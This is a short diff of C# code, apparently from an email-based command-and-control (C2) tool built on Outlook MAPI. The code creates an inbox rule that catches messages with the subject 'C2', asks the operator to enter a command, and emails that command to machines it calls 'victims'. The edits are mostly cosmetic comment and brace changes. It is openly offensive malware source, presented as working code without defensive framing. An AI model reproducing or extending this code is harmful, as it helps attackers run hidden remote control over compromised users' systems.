@@ -138,7 +138,7 @@ namespace ExchangeExample
             // Connect to the user's open MAPI session
             outlookNameSpace = OutlookApplication.GetNamespace("MAPI");
 
-            // Rules
+            
 
 
 
@@ -175,8 +175,12 @@ namespace ExchangeExample
                     break;
                 }
             }
+
+            // Rules
             if (!exists)
             {
+
+                // Crete Rule
                 Outlook.Rule rule = rules.Create("C2", Outlook.OlRuleType.olRuleReceive);
                 rule.Conditions.Subject.Text = new string[] { "C2" };
                 rule.Conditions.Subject.Enabled = true;
@@ -186,7 +190,6 @@ namespace ExchangeExample
                 rule.Enabled = true;
                 rules.Save(true);
             }
-            exists = false;
 
 
 
@@ -220,13 +223,16 @@ namespace ExchangeExample
                                 Console.WriteLine("Enter Commnand:");
                                 string com = Console.ReadLine();
                                 if (victims.Count > 1)
+
+                                    // Send command mail to victim
                                     SendEmailFromAccount(OutlookApplication, "C2", "command " + com, victims);
                                 else
                                 {
+
+                                    // Send command mail to victims
                                     if (victims.Count == 1)
-                                    {
                                         SendEmailFromAccount(OutlookApplication, "C2", "command " + com, victims[0]);
-                                    }
+                                    
                                     else
                                         Console.WriteLine("No victims found");
                                 }
